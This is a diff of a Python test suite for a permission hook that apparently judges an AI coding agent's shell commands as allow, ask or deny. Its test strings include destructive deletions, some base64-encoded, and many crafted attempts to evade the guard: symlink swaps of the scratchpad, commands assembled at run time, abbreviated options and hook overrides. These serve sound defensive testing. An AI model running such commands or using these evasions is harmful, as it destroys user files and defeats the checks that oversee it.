-        # C3: nothing beside the deletion may move a branch or drop a remote ref
-        expect('branch moved first', [
-            'git switch feat && git add x && git commit -m r && git switch main && git branch -D feat',
-            'git branch -f feat wip && git branch -D feat', 'git checkout -B feat wip; git branch -D feat',
-            'git fetch && git branch -D feat', 'git branch -dr origin/feat; git branch -D feat',
-            'echo x > .git/refs/heads/feat; git branch -D feat', 'make; git branch -D feat',
-            'git -c core.hooksPath=/x switch main && git branch -D feat'], 'ask')
-        expect('branch beside readers', [
-            'git switch main && git branch -D feat', 'git status && git branch -D feat 2>&1 | tail -1',
-            'git log -1 feat; git branch -D feat; git branch -a'], 'allow')
-        # C4: `cd x/..` drops x before following it, as the shell does
-        os.makedirs(os.path.join(repo, 'sub', 'x'))
-        os.makedirs(os.path.join(repo, 'other'))
-        os.symlink(os.path.join(repo, 'sub'), os.path.join(base, 'lnk'))
-        _git('-C', other, 'branch', 'feat')  # not on any remote
-        cmd = f'cd {base}/lnk/../other && git branch -D feat'
-        check('logical cd: the shell\'s folder is named, nothing certain',
-              p._git_command_dirs(cmd, repo), ([os.path.join(repo, 'other'), other], False))
-        expect('logical cd', [cmd], 'ask')
-        check('cd through a link without ..: certain', p._git_command_dirs(f'cd {base}/lnk/x', repo),
-              ([os.path.join(repo, 'sub', 'x')], True))
-        # C5: a wrapper's relative folder is resolved
-        os.symlink(os.path.join(base, 'outside'), os.path.join(wt, 'linked'))
-        expect('wrapper folder through a link', [f'cd {wt} && PYTHONPATH=src make -C linked test',
-                                                 'PYTHONPATH=src make -C ../wt test'], 'ask')
-        expect('wrapper folder in the project', [f'cd {wt} && PYTHONPATH=src make -C sub test',
-                                                 f'PYTHONPATH=src make -C {wt} test'], 'allow')
-
-        # Review round 2: allow only what is known safe
-        # C2: zsh-tied prompt names (and every other shell-set name) are no constants
-        expect('special names (zsh tied)', ['RPS1=-n; RPROMPT=-x; git clean -f $RPS1',
-                                            'TIMEFMT=-n; git clean -f $TIMEFMT'], 'ask')
-        # C12: a find counts as link-free only when it is the literal delete judged
-        rest = f'{rmrf} {pad}/n/x'
-        expect('find built at run time beside a scratch delete', [
-            f'E=$(printf %s -exec); find {pad}/a "$E" ln -s ~ {pad}/n \\; ; {rest}',
-            f'E=$(printf %s -exec); find /tmp/sp-a "$E" ln -s ~ /tmp/sp-a/n \\; ; {rmrf} /tmp/sp-a/n/x',
-            f'find {pad}/a -name x; {rest}', f'S={pad}; find "$S/t5" -delete',
-            f'find {pad}/t5 -newer x -delete', f'find {pad}/t5 -delete -print'], 'ask')
-        check('zsh =cmd is no literal find word', p._literal_find_delete('find =ls -delete'), False)
-        expect('literal scratch find', [f'find {pad}/t5 -type f -name "*.log" -delete',
-                                        f'find {pad}/t5 -mindepth 1 -delete 2>/dev/null'], 'allow')
-        # C13: the commands beside `git branch -D` are allowlisted word by word
-        expect('branch deletion beside a built or unknown word', [
-            'O=--output=.git/refs/remotes/origin/feat; git log -1 --format=%H main "$O"; git branch -D feat',
-            'git log -1 --outp=.git/refs/remotes/origin/feat main; git branch -D feat',
-            'git log -1 --ou .git/refs/remotes/origin/feat main; git branch -D feat',
-            'GIT_DIR=x git log -1; git branch -D feat', 'env git status; git branch -D feat',
-            'git rev-parse --git-path x; git branch -D feat', 'git -c x=y status; git branch -D feat',
-            'git switch -c x && git branch -D feat'], 'ask')
-        # (3) the protected shapes
-        wt3 = os.path.join(base, 'wt', 'feat')
-        _git('-C', repo, 'worktree', 'add', '-q', wt3, 'feat')
-        expect('branch on a remote beside known readers', [
-            f'git worktree remove {wt3} && git branch -D feat',
-            f'git worktree remove --force {wt3} && git branch -D feat',
-            'git switch main && git branch -D feat', 'git checkout -q main && git branch -D feat',
-            'git log --oneline -3 feat && git branch -D feat 2>&1 | tail -1',
-            f'git -C {repo} status --short && git branch -D feat'], 'allow')
-        # C14/C15: where cd lands is not followed when the words can't say
-        check('zsh cd OLD NEW: not certain', p._git_command_dirs(f'cd {base} wt && git push', repo)[1], False)
-        check('cd under CDPATH: not certain',
-              p._git_command_dirs(f'CDPATH={wt}; cd sub && git push', repo)[1], False)
-        check('zsh cdpath: not certain', p._git_command_dirs(f'cdpath=({wt}); cd sub; git push', repo)[1], False)
-        check('cd +1: not certain', p._git_command_dirs('cd +1 && git push', repo)[1], False)
-        check('cd ./x under CDPATH: certain', p._git_command_dirs(
-            f'CDPATH={base}; cd ./sub && git push', repo), ([repo, os.path.join(repo, 'sub')], True))
-        old_cdpath = os.environ.get('CDPATH')
-        os.environ['CDPATH'] = base
+    call_state = p.CallState(*p.session_dirs(session))
+    with p.using_state(call_state):
         try:
-            check('cd under an exported CDPATH: not certain', p._git_command_dirs('cd sub && git push', repo)[1],
-                  False)
-            expect('import path after a cd CDPATH may redirect', [f'cd sub && {tail}'], 'ask')
-        finally:
-            os.environ.pop('CDPATH') if old_cdpath is None else os.environ.__setitem__('CDPATH', old_cdpath)
-        expect('import path after cd OLD NEW', [f'cd {wt} sub && {tail}'], 'ask')
-        # C16: repeated folder options chain, or count as outside
-        expect('repeated folder options', [f'PYTHONPATH=src make -C {wt} -C linked test',
-                                           'PYTHONPATH=src ninja -C sub -C sub',
-                                           f'PYTHONPATH=src uv run --directory {wt} --project sub pytest'], 'ask')
-        expect('repeated make -C inside', [f'PYTHONPATH=src make -C {wt} -C sub test'], 'allow')
+            # 1. Where the scratchpad is: sent, or derived from the transcript
+            uid = os.getuid()
+            check('scratchpad from the hook input', call_state.scratchpad, pad)
+            check('scratchpad derived from session and transcript', p._session_scratchpad(
+                {'session_id': 'abc-1', 'transcript_path': '/Users/x/.claude/projects/-Users-x-p/abc-1.jsonl'}),
+                os.path.realpath(f'/tmp/claude-{uid}/-Users-x-p/abc-1/scratchpad'))
+            for label, data in (
+                    ('transcript of another session', {'session_id': 'abc-1',
+                                                       'transcript_path': '/u/.claude/projects/s/abc-2.jsonl'}),
+                    ('a session id with a slash', {'session_id': '../x',
+                                                   'transcript_path': '/u/.claude/projects/s/../x.jsonl'}),
+                    ('no session at all', {}),
+                    ('a scratchpad outside the temp roots', {'scratchpad_dir': '/Users/x/scratchpad'}),
+                    ('a scratchpad reached through a link', {'scratchpad_dir': os.path.join(pad, 'l', 'scratchpad')}),
+                    ('not named scratchpad', {'scratchpad_dir': os.path.dirname(pad)})):
+                check(f'no scratchpad: {label}', p._session_scratchpad(data), None)
 
-        # Review round 3, from a checkout where feat has work only here
-        p.set_hook_cwd({'cwd': other})
-        # G1: a flag zsh reads as cd OLD NEW and bash 3.2 rejects: both stay put
-        expect('cd flag that may not move', [f'cd -e {repo}; git branch -D feat',
-                                             f'pushd -P {repo}; git branch -D feat',
-                                             f'cd -q {repo}; git branch -D feat',
-                                             f'popd {repo}; git branch -D feat'], 'ask')
-        expect('cd -L/-P: both shells move', [f'cd -LP {repo}; git branch -D feat'], 'allow')
-        # C18: a quoted or escaped ~ is a folder named ~, not $HOME
-        os.makedirs(os.path.join(other, '~'))
-        old_home = os.environ['HOME']
-        os.environ['HOME'] = repo
-        try:
-            expect('quoted ~', ["git -C '~' branch -D feat", 'git -C "~" branch -D feat',
-                                'git -C \\~ branch -D feat', "cd '~' && git branch -D feat",
-                                'git -C ~"/" branch -D feat', f'HOME={repo}; git -C ~ branch -D feat'], 'ask')
-            check("quoted ~: not certain", p._git_command_dirs("git -C '~' push", other)[1], False)
-            check('unquoted ~ is $HOME', p._git_command_dirs('cd ~/ && git -C ~ push', other),
-                  ([repo], True))
+            # 2 and 6. A name set once to a literal is not empty; this session's
+            # scratchpad is deleted by rule
+            expect('own scratchpad', [
+                f'S={pad}; {rmrf} $S/t5', f'S={pad}; {rmrf} "$S/t5"', f'S={pad} && {rmrf} "$S"/t5',
+                f'S={pad}; {rmrf} "${{S:?}}/t5"', f'S={pad}; {rmrf} "${{S:?}}/a/b"',
+                f'find {pad}/t5 -delete', f'cd {pad} && find t5 -delete',
+                f'cd {pad} && {rmrf} t5', f"find {pad}/t5 -name '*.o' -delete"], 'allow')
+            expect('constant, not scratch', [f'S=/opt/sp-x; {rmrf} $S/build', f'k=x; {rmrf} /tmp/$k',
+                                             f'X=x; {rmrf} ~/cache/$X'], 'ask')
+            # a loop name over literal words is never empty inside its body (1.5.0)
+            expect('loop name, not steered', [f'for S in {pad}; do {rmrf} $S/t5; done'], 'ask')
+            expect('still steered', [
+                f'if true; then S={pad}; fi; {rmrf} $S/t5', f'S=$(pwd); {rmrf} $S/t5',
+                f'S={pad}; S=$(pwd); {rmrf} $S/t5', f'S={pad}; read S; {rmrf} $S/t5',
+                f'false || S={pad}; {rmrf} $S/t5',
+                f'S={pad} | cat; {rmrf} $S/t5', f'S={pad}; unset S; {rmrf} $S/t5',
+                f'(S={pad}); {rmrf} $S/t5', f'f() {{ S={pad}; }}; f; {rmrf} $S/t5',
+                f'S={pad}; $E "$Y"; {rmrf} $S/t5', f'{rmrf} $S/t5; S={pad}', f'S=; {rmrf} $S/t5',
+                f'S={pad}; export S; {rmrf} $S/t5', f'S={pad} # c\n{rmrf} $S/t5',
+                f'S={pad}; case x in x) S=;; esac; {rmrf} $S/t5', f'S={pad}; {rmrf} $S/../t5',
+                # shapes Claude Code itself asks about however S was set
+                f'S={pad}; {rmrf} $S/', f'S={pad}; {rmrf} "$S/"', f'S={pad}; {rmrf} $S/*',
+                f'S={pad}; {rmrf} "$S"/*', f'S={pad}; {rmrf} $S/$k', f'X=x; XY=y; {rmrf} "/tmp/$X/$XY"'], 'deny')
+            expect('not this session\'s scratch', [
+                f'S={pad}; {rmrf} "${{S:?}}"', f'S={pad}; {rmrf} "${{S:?}}"/', f'find {pad} -delete',
+                f'find {pad} -name x -delete', f'S={pad_b}; {rmrf} "${{S:?}}/t5"', f'find {pad_b}/t5 -delete',
+                f'S={pad}/..; {rmrf} "${{S:?}}/t5"', f'S={pad}; {rmrf} "${{S:?}}/l/x"',
+                f'find {pad}/l/ -delete', f'find -L {pad}/t5 -delete', f'find {pad}/t5 -follow -delete',
+                f'S={pad}; ln -s ~ $S/n; {rmrf} "${{S:?}}/n/x"', f'{rmrf} "${{S:?}}/t5"',
+                f'if true; then S={pad}; fi; {rmrf} "${{S:?}}/t5"', f'S=$(pwd); {rmrf} "${{S:?}}/t5"',
+                f'find {base}/x -delete', f'IFS=/; S={pad}; find $S/t5 -delete',
+                # a filtered find elsewhere still goes to the LLM, not to a deny
+                'find ~/Documents -name x.o -delete', f'cd "$X" && find {pad}/t5 -delete'], 'ask')
+            call_state.cwd, call_state.scratchpad = p.session_dirs({'cwd': repo})
+            expect('no scratchpad known', [f'S={pad}; {rmrf} "${{S:?}}/t5"', f'find {pad}/t5 -delete'], 'ask')
+            call_state.cwd, call_state.scratchpad = p.session_dirs(session)
+
+            # 2. A word built only from such names is judged written out
+            expect('constant words', ['B=main; git push origin $B', f'R={repo}; git -C $R status',
+                                      'M=755; chmod $M x.sh'], 'allow')
+            expect('built words', ['F=hard; git reset --$F', 'if true; then F=soft; fi; git reset --$F',
+                                   'F=$(echo soft); git reset --$F', 'F=soft; F=hard; git reset --$F',
+                                   'F=soft; git reset --$F$G', 'git reset --$F'], 'ask')
+            check('a written-out reset keeps its own reason', 'reset --hard' in p.evaluate_bash(
+                'F=hard; git reset --$F', log_unknowns=False)[1], True)
+
+            # 3. Only a cd the structure scopes counts, not a ( in some text
+            heredoc = f"cd {repo} && git commit -qF - <<'EOF'\nfix (x)\nEOF\ngit push origin main"
+            for cmd in (f'cd {repo} && git commit -qm "fix (x)" && git push origin main', heredoc,
+                        f'cd {repo}; echo "a)"; git push origin main'):
+                check(f'cd still followed: {cmd.replace(base, "B")!r}', p._git_command_dirs(cmd, base),
+                      ([repo], True))
+            check('a $(git …) before the cd runs where the command starts', p._git_command_dirs(
+                f'X=$(git rev-parse HEAD); cd {repo} && git push origin main', base), ([base, repo], True))
+            for cmd in (f'(cd {other}); git push', f'{{ cd {other}; }} | cat; git push',
+                        f'if x; then cd {other}; fi; git push', f'cd {other} | git push',
+                        f'cd {other} & git push', f'f() {{ cd {other}; }}; git push',
+                        f'for x in 1; do cd {other}; done; git push', f'bash -c "cd {other}"; git push'):
+                check(f'a scoped cd is doubted: {cmd.replace(base, "B")!r}',
+                      p._git_command_dirs(cmd, base)[1], False)
+
+            # 4. git -c settings that switch something off for one run
+            expect('inert -c', ['git -c core.hooksPath=/dev/null commit -qm x',
+                                'git -c CORE.HOOKSPATH=/dev/null commit -qm x',
+                                'git -c credential.helper= fetch origin'], 'allow')
+            expect('-c that runs something', [
+                'git -c core.hooksPath=/some/dir commit -qm x', 'git -c core.hooksPath=/dev/null/x commit -qm x',
+                'git -c credential.helper=x fetch origin', 'git -c credential.helper fetch origin',
+                'git -c credential.helper=" " fetch origin',
+                'git config core.hooksPath /dev/null', 'git config credential.helper ""'], 'ask')
+
+            # 5. A relative import path in the working folder or a linked worktree
+            tail = 'PYTHONPATH=src python3 -m pytest 2>&1 | tail -5'
+            expect('import path in the project', [f'cd {wt} && {tail}', tail, f'grep -q x y; {tail}',
+                                                 f'cd {wt}/sub && {tail}'], 'allow')
+            expect('import path elsewhere', [
+                f'cd {base} && {tail}', f'cd {wt2} && {tail}', f'ln -s /x y; {tail}',
+                f'cd {wt} && PYTHONPATH=../src python3 -m pytest | tail -5',
+                'PYTHONPATH=/tmp/x python3 -m pytest | tail -5', f'(cd {base}); {tail}',
+                f'cd {wt} && git status && {tail}', f'cd "$X" && {tail}'], 'ask')
+
+            # 7. A branch whose tip a remote-tracking ref holds loses nothing
+            expect('branch on a remote', ['git branch -D feat', 'git branch -d -f feat',
+                                          'git branch --delete --force feat',
+                                          f'cd {repo} && git branch -D feat', f'git -C {repo} branch -D feat'],
+                   'allow')
+            expect('branch with work only here', [
+                'git branch -D wip', 'git branch -D feat wip', 'git branch -D nosuch',
+                'git branch -D -r origin/feat', 'git branch -D $B', 'B=feat; git branch -D $B x',
+                'cd "$X" && git branch -D feat', f'git -C {other} branch -D feat',
+                f'(cd {other}); git branch -D feat', 'git branch -D --contains HEAD feat',
+                'git branch -D feat..wip'], 'ask')
+
+            # Review fixes: a pass on probed state needs the rest of the command
+            # unable to change it, and paths resolved as the shell resolves them.
+            # C1: the scratchpad itself can be swapped for a link
+            swap = f'S={pad}; mv "$S" "$S-old"; ln -s ~ "$S"; '
+            expect('scratchpad swapped for a link', [f'{swap}{rmrf} "${{S:?}}/Documents"',
+                                                     f'{swap}find "$S/Documents" -delete',
+                                                     f'S={pad}; python3 x.py; {rmrf} "${{S:?}}/t5"'], 'ask')
+            # C2: names the shell sets or ties are no constants
+            expect('special names', ['argv=--dry-run; set --; git clean -f $argv',
+                                     'PS1=-n; prompt=-x; git clean -f $PS1'], 'ask')
+            expect('plain name', ['N=-n; git clean -f $N'], 'allow')
+            # C3: nothing beside the deletion may move a branch or drop a remote ref
+            expect('branch moved first', [
+                'git switch feat && git add x && git commit -m r && git switch main && git branch -D feat',
+                'git branch -f feat wip && git branch -D feat', 'git checkout -B feat wip; git branch -D feat',
+                'git fetch && git branch -D feat', 'git branch -dr origin/feat; git branch -D feat',
+                'echo x > .git/refs/heads/feat; git branch -D feat', 'make; git branch -D feat',
+                'git -c core.hooksPath=/x switch main && git branch -D feat'], 'ask')
+            expect('branch beside readers', [
+                'git switch main && git branch -D feat', 'git status && git branch -D feat 2>&1 | tail -1',
+                'git log -1 feat; git branch -D feat; git branch -a'], 'allow')
+            # C4: `cd x/..` drops x before following it, as the shell does
+            os.makedirs(os.path.join(repo, 'sub', 'x'))
+            os.makedirs(os.path.join(repo, 'other'))
+            os.symlink(os.path.join(repo, 'sub'), os.path.join(base, 'lnk'))
+            _git('-C', other, 'branch', 'feat')  # not on any remote
+            cmd = f'cd {base}/lnk/../other && git branch -D feat'
+            check('logical cd: the shell\'s folder is named, nothing certain',
+                  p._git_command_dirs(cmd, repo), ([os.path.join(repo, 'other'), other], False))
+            expect('logical cd', [cmd], 'ask')
+            check('cd through a link without ..: certain', p._git_command_dirs(f'cd {base}/lnk/x', repo),
+                  ([os.path.join(repo, 'sub', 'x')], True))
+            # C5: a wrapper's relative folder is resolved
+            os.symlink(os.path.join(base, 'outside'), os.path.join(wt, 'linked'))
+            expect('wrapper folder through a link', [f'cd {wt} && PYTHONPATH=src make -C linked test',
+                                                     'PYTHONPATH=src make -C ../wt test'], 'ask')
+            expect('wrapper folder in the project', [f'cd {wt} && PYTHONPATH=src make -C sub test',
+                                                     f'PYTHONPATH=src make -C {wt} test'], 'allow')
+
+            # Review round 2: allow only what is known safe
+            # C2: zsh-tied prompt names (and every other shell-set name) are no constants
+            expect('special names (zsh tied)', ['RPS1=-n; RPROMPT=-x; git clean -f $RPS1',
+                                                'TIMEFMT=-n; git clean -f $TIMEFMT'], 'ask')
+            # C12: a find counts as link-free only when it is the literal delete judged
+            rest = f'{rmrf} {pad}/n/x'
+            expect('find built at run time beside a scratch delete', [
+                f'E=$(printf %s -exec); find {pad}/a "$E" ln -s ~ {pad}/n \\; ; {rest}',
+                f'E=$(printf %s -exec); find /tmp/sp-a "$E" ln -s ~ /tmp/sp-a/n \\; ; {rmrf} /tmp/sp-a/n/x',
+                f'find {pad}/a -name x; {rest}', f'S={pad}; find "$S/t5" -delete',
+                f'find {pad}/t5 -newer x -delete', f'find {pad}/t5 -delete -print'], 'ask')
+            check('zsh =cmd is no literal find word', p._literal_find_delete('find =ls -delete'), False)
+            expect('literal scratch find', [f'find {pad}/t5 -type f -name "*.log" -delete',
+                                            f'find {pad}/t5 -mindepth 1 -delete 2>/dev/null'], 'allow')
+            # C13: the commands beside `git branch -D` are allowlisted word by word
+            expect('branch deletion beside a built or unknown word', [
+                'O=--output=.git/refs/remotes/origin/feat; git log -1 --format=%H main "$O"; git branch -D feat',
+                'git log -1 --outp=.git/refs/remotes/origin/feat main; git branch -D feat',
+                'git log -1 --ou .git/refs/remotes/origin/feat main; git branch -D feat',
+                'GIT_DIR=x git log -1; git branch -D feat', 'env git status; git branch -D feat',
+                'git rev-parse --git-path x; git branch -D feat', 'git -c x=y status; git branch -D feat',
+                'git switch -c x && git branch -D feat'], 'ask')
+            # (3) the protected shapes
+            wt3 = os.path.join(base, 'wt', 'feat')
+            _git('-C', repo, 'worktree', 'add', '-q', wt3, 'feat')
+            expect('branch on a remote beside known readers', [
+                f'git worktree remove {wt3} && git branch -D feat',
+                f'git worktree remove --force {wt3} && git branch -D feat',
+                'git switch main && git branch -D feat', 'git checkout -q main && git branch -D feat',
+                'git log --oneline -3 feat && git branch -D feat 2>&1 | tail -1',
+                f'git -C {repo} status --short && git branch -D feat'], 'allow')
+            # C14/C15: where cd lands is not followed when the words can't say
+            check('zsh cd OLD NEW: not certain', p._git_command_dirs(f'cd {base} wt && git push', repo)[1], False)
+            check('cd under CDPATH: not certain',
+                  p._git_command_dirs(f'CDPATH={wt}; cd sub && git push', repo)[1], False)
+            check('zsh cdpath: not certain', p._git_command_dirs(f'cdpath=({wt}); cd sub; git push', repo)[1], False)
+            check('cd +1: not certain', p._git_command_dirs('cd +1 && git push', repo)[1], False)
+            check('cd ./x under CDPATH: certain', p._git_command_dirs(
+                f'CDPATH={base}; cd ./sub && git push', repo), ([repo, os.path.join(repo, 'sub')], True))
+            old_cdpath = os.environ.get('CDPATH')
+            os.environ['CDPATH'] = base
+            try:
+                check('cd under an exported CDPATH: not certain', p._git_command_dirs('cd sub && git push', repo)[1],
+                      False)
+                expect('import path after a cd CDPATH may redirect', [f'cd sub && {tail}'], 'ask')
+            finally:
+                os.environ.pop('CDPATH') if old_cdpath is None else os.environ.__setitem__('CDPATH', old_cdpath)
+            expect('import path after cd OLD NEW', [f'cd {wt} sub && {tail}'], 'ask')
+            # C16: repeated folder options chain, or count as outside
+            expect('repeated folder options', [f'PYTHONPATH=src make -C {wt} -C linked test',
+                                               'PYTHONPATH=src ninja -C sub -C sub',
+                                               f'PYTHONPATH=src uv run --directory {wt} --project sub pytest'], 'ask')
+            expect('repeated make -C inside', [f'PYTHONPATH=src make -C {wt} -C sub test'], 'allow')
+
+            # Review round 3, from a checkout where feat has work only here
+            call_state.cwd, call_state.scratchpad = p.session_dirs({'cwd': other})
+            # G1: a flag zsh reads as cd OLD NEW and bash 3.2 rejects: both stay put
+            expect('cd flag that may not move', [f'cd -e {repo}; git branch -D feat',
+                                                 f'pushd -P {repo}; git branch -D feat',
+                                                 f'cd -q {repo}; git branch -D feat',
+                                                 f'popd {repo}; git branch -D feat'], 'ask')
+            expect('cd -L/-P: both shells move', [f'cd -LP {repo}; git branch -D feat'], 'allow')
+            # C18: a quoted or escaped ~ is a folder named ~, not $HOME
+            os.makedirs(os.path.join(other, '~'))
+            old_home = os.environ['HOME']
+            os.environ['HOME'] = repo
+            try:
+                expect('quoted ~', ["git -C '~' branch -D feat", 'git -C "~" branch -D feat',
+                                    'git -C \\~ branch -D feat', "cd '~' && git branch -D feat",
+                                    'git -C ~"/" branch -D feat', f'HOME={repo}; git -C ~ branch -D feat'], 'ask')
+                check("quoted ~: not certain", p._git_command_dirs("git -C '~' push", other)[1], False)
+                check('unquoted ~ is $HOME', p._git_command_dirs('cd ~/ && git -C ~ push', other),
+                      ([repo], True))
+            finally:
+                os.environ['HOME'] = old_home
+            # Sweep: a glob or brace in a cd target is expanded first
+            os.makedirs(os.path.join(other, '{x,}'))  # `cd {x,}` is `cd x`
+            check('cd into a brace: not certain', p._git_command_dirs('cd {x,} && git push', other)[1], False)
+            check('git --bare: not certain', p._git_command_dirs('git --bare push', other)[1], False)
+            check("cd into a quoted brace: that folder", p._git_command_dirs("cd '{x,}' && git push", other),
+                  ([os.path.join(other, '{x,}')], True))
+            call_state.cwd, call_state.scratchpad = p.session_dirs(session)
+            # Sweep: git reads a unique prefix of a long option as the option
+            expect('git long option abbreviated', ['git reset --har', 'git clean --forc -d',
+                                                   'git checkout --forc main', 'git branch --dele --forc wip',
+                                                   'git switch --disc main'], 'ask')
+            expect('git long option abbreviated, harmless', ['git clean -f --dry', 'git restore --stag x'],
+                   'allow')
+            # C21: an option's value that looks like a prefix stays a value
+            expect('option value never spelled out', ['git restore --pathspec-from-file --stag',
+                                                      'git restore -s --stag f',
+                                                      'git restore --source --stag f',
+                                                      'git restore --pathspec-from-file --staged'], 'ask')
+            expect('restore --staged still index-only', ['git restore --staged f',
+                                                         'git restore --pathspec-from-file=list --staged'],
+                   'allow')
+            # ... as GNU rm and chmod read a prefix of --recursive
+            expect('--recursive abbreviated', [d('cm0gLS1yZWMgLWYgL29wdC9zcC14L2J1aWxk'), d('Y2htb2QgLS1yZWMgNzc3IGRpcg==')],
+                   'ask')
         finally:
-            os.environ['HOME'] = old_home
-        # Sweep: a glob or brace in a cd target is expanded first
-        os.makedirs(os.path.join(other, '{x,}'))  # `cd {x,}` is `cd x`
-        check('cd into a brace: not certain', p._git_command_dirs('cd {x,} && git push', other)[1], False)
-        check('git --bare: not certain', p._git_command_dirs('git --bare push', other)[1], False)
-        check("cd into a quoted brace: that folder", p._git_command_dirs("cd '{x,}' && git push", other),
-              ([os.path.join(other, '{x,}')], True))
-        p.set_hook_cwd(session)
-        # Sweep: git reads a unique prefix of a long option as the option
-        expect('git long option abbreviated', ['git reset --har', 'git clean --forc -d',
-                                               'git checkout --forc main', 'git branch --dele --forc wip',
-                                               'git switch --disc main'], 'ask')
-        expect('git long option abbreviated, harmless', ['git clean -f --dry', 'git restore --stag x'],
-               'allow')
-        # C21: an option's value that looks like a prefix stays a value
-        expect('option value never spelled out', ['git restore --pathspec-from-file --stag',
-                                                  'git restore -s --stag f',
-                                                  'git restore --source --stag f',
-                                                  'git restore --pathspec-from-file --staged'], 'ask')
-        expect('restore --staged still index-only', ['git restore --staged f',
-                                                     'git restore --pathspec-from-file=list --staged'],
-               'allow')
-        # ... as GNU rm and chmod read a prefix of --recursive
-        expect('--recursive abbreviated', [d('cm0gLS1yZWMgLWYgL29wdC9zcC14L2J1aWxk'), d('Y2htb2QgLS1yZWMgNzc3IGRpcg==')],
-               'ask')
-    finally:
-        p._probe = real_probe
-        p.set_hook_cwd({})
+            p._probe = real_probe
 
 
 def _iso_ago(minutes):
@@ -6097,14 +6120,11 @@ def test_session_provenance_and_loss_evidence():
     atexit.register(shutil.rmtree, tmp_side, ignore_errors=True)
     os.makedirs(os.path.join(tmp_side, 'a'))
     os.symlink(os.path.join(tmp_side, 'a'), os.path.join(base, 'tmplnk'))
-    p.set_hook_cwd({'cwd': cwd})
-    try:
+    with p.using_state(p.CallState(*p.session_dirs({'cwd': cwd}))):
         check('bash cd -PL is logical: delete asks', p.evaluate_bash(
             f'cd -PL {base}/tmplnk/.. && {rmrf} build', log_unknowns=False)[0], 'ask')
         check('cd -LP is physical in both: delete in /tmp passes', p.evaluate_bash(
             f'cd -LP {base}/tmplnk/.. && {rmrf} build', log_unknowns=False)[0], 'allow')
-    finally:
-        p.set_hook_cwd({})
     # C18: a quoted ~ is a folder named ~, in targets and in earlier commands
     check("quoted ~: no target", targets(f"{rmrf} '~/x' \"~\"/y \\~/z"), [])
     check("quoted ~ in a name's value: no target", targets(f"D='~/x'; {rmrf} \"$D\""), [])
@@ -6185,15 +6205,14 @@ def test_session_provenance_and_loss_evidence():
     with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'llm_eval_cases.json')) as f:
         cases = [c for c in json.load(f)['cases'] if 'sandbox' in c]
     check('eval cases with session provenance present', len(cases) >= 10, True)
-    try:
+    call_state = p.CallState()
+    with p.using_state(call_state):
         for c in cases:
             root = c['sandbox']['root']
             inp = json.loads(base64.b64decode(c['input_b64'])) if 'input_b64' in c else c['input']
             cmd = inp['command'].replace('{root}', root)
-            p.set_hook_cwd({'cwd': c['cwd'].replace('{root}', root)})
+            call_state.cwd, call_state.scratchpad = p.session_dirs({'cwd': c['cwd'].replace('{root}', root)})
             check(f'{c["id"]}: rules leave it to the judge', p.evaluate_bash(cmd, log_unknowns=False)[0], 'ask')
-    finally:
-        p.set_hook_cwd({})
 
 
 def test_dir_options_leave_the_project():
@@ -6203,8 +6222,7 @@ def test_dir_options_leave_the_project():
     proj = os.path.realpath(tempfile.mkdtemp(prefix='sp-dirs-'))
     atexit.register(shutil.rmtree, proj, ignore_errors=True)
     os.makedirs(os.path.join(proj, 'sub'))
-    p.set_hook_cwd({'cwd': proj})
-    try:
+    with p.using_state(p.CallState(cwd=proj)):
         def verdict(cmd):
             return p.evaluate_bash(cmd, log_unknowns=False)[0]
 
@@ -6244,8 +6262,6 @@ def test_dir_options_leave_the_project():
         check('reason names the option', 'run elsewhere by -C /tmp/x' in reason, True)
         check('no import path: a dir option alone is not this check\'s business',
               p._env_hazard('make -C /tmp/x test'), None)
-    finally:
-        p.set_hook_cwd({})
 
 
 
@@ -6296,395 +6312,397 @@ def test_phase1b_fewer_judge_calls():
     rmrf = d('cm0gLXJm')
     base = os.path.realpath(tempfile.mkdtemp(prefix='sp-p16-'))
     atexit.register(shutil.rmtree, base, ignore_errors=True)
-    p.set_hook_cwd({'cwd': base})
+    call_state = p.CallState(cwd=base)
+    with p.using_state(call_state):
 
-    def ev(cmd):
-        return p.evaluate_bash(cmd, log_unknowns=False)[0]
+        def ev(cmd):
+            return p.evaluate_bash(cmd, log_unknowns=False)[0]
 
-    # ---- a. a quoted Python heredoc of data code is read like `-c` code ----
-    body = ("import json, collections\nc = collections.Counter()\n# count the kinds\n"
-            "for line in open('data.jsonl'):\n    r = json.loads(line)\n"
-            "    c[r['k'].replace('a', 'b')] += 1\nprint(c.most_common(3))\n")
-    heredoc = "python3 - <<'EOF'\n" + body + "EOF"
-    allows = [heredoc, "python3 -I -B - <<'EOF'\n" + body + 'EOF', "python3 <<'EOF'\n" + body + 'EOF',
-              "python3 - <<'EOF' | tail -3\n" + body + 'EOF',
-              "python3 - <<'EOF' > out.txt 2>&1\n" + body + 'EOF',
-              "cd /tmp && python3 - <<'EOF'\n" + body + 'EOF',
-              "timeout 60 python3 - <<'EOF'\n" + body + 'EOF',
-              "echo start; python3 - <<'EOF'\n" + body + "EOF\necho done",
-              "python3 - <<'EOF'\n# coding: utf-8\nprint(1)\nEOF"]
-    for cmd in allows:
-        check(f'heredoc python allowed: {cmd[:40]!r}', ev(cmd), 'allow')
-    tq = "'" * 3
-    asks = [
-        ("unquoted delimiter", "python3 - <<EOF\n" + body + 'EOF'),
-        ("a pipe into it too", "cat x | python3 - <<'EOF'\n" + body + 'EOF'),
-        ("a pipe into its group", "cat x | { python3 - <<'EOF'\n" + body + 'EOF\n}'),
-        ("a second stdin", "python3 - <<'EOF' < other.py\n" + body + 'EOF'),
-        ("a second stdin written on", "python3 - <<'EOF'<other.py\n" + body + 'EOF'),
-        ("a here-string written on", "python3 - <<'EOF'<<<'print(2)'\n" + body + 'EOF'),
-        ("a second stdin after a redirect", "python3 - <<'EOF'>o.txt<other.py\n" + body + 'EOF'),
-        ("uuid.getnode runs programs", "python3 - <<'EOF'\nimport uuid\nprint(uuid.getnode())\nEOF"),
-        ("stdin duplicated from another fd", "python3 - <<'EOF' 0>&3\n" + body + 'EOF'),
-        ("a field looked up by a built name",
-         "python3 - <<'EOF'\nimport string\nk = '_' * 2 + 'init' + '_' * 2\n"
-         "print(string.Formatter().get_field('0.' + k, [1], {})[0])\nEOF"),
-        ("a computed call target", "python3 - <<'EOF'\nd = {'a': len}\nprint(d['a']('x'))\nEOF"),
-        ("a callable held in a name", "python3 - <<'EOF'\nf = len\nprint(f('x'))\nEOF"),
-        ("a builtin name rebound", "python3 - <<'EOF'\nprint = len\nprint('x')\nEOF"),
-        ("a frame's builtins", "python3 - <<'EOF'\ndef g():\n    yield 1\nprint(g().gi_frame)\nEOF"),
-        ("a module another module re-exports",
